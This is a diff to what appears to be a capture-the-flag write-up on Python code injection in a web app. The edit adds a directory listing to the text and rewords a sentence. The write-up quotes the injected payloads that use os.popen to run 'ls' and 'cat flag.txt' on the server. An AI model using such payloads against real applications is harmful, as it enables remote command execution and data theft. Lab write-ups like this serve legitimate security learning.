@@ -31,7 +31,9 @@ To confirm this, I injected the code '__import__('os').popen('ls').read()'
 
 ![output](screenshots/screenshot2.png)
 
-Afterwards, I injected code:'__import__('os').popen('cat flag.txt').read()' to read the flag
+Result: Dockerfile app.py flag.txt static
+
+Afterwards, I injected the code:'__import__('os').popen('cat flag.txt').read()' to read the flag
 
 ![output](screenshots/screenshot3.png)
 
